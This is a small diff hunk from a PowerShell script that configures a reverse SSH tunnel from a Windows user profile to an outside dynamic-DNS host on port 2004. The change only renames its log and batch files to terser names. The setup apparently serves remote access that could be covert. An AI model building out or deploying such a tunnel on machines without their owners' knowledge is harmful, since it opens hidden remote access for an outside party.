@@ -26,8 +26,8 @@ $pubKeyFile = "$keyFile.pub"
 $user = "nobody1"
 $remote_host = "edcoretecmm.sytes.net"
 $receivedPort = 2004
-$logFile = "$env:USERPROFILE\Other\ssh_reverse_tunnel.log"
-$batFilePath = "$env:USERPROFILE\Other\start_reverse_ssh.bat"
+$logFile = "$env:USERPROFILE\Other\rev_ssh.log"
+$batFilePath = "$env:USERPROFILE\Other\rev_ssh.bat"
 
 # Create Other directory if not exists
 $otherDir = "$env:USERPROFILE\Other"
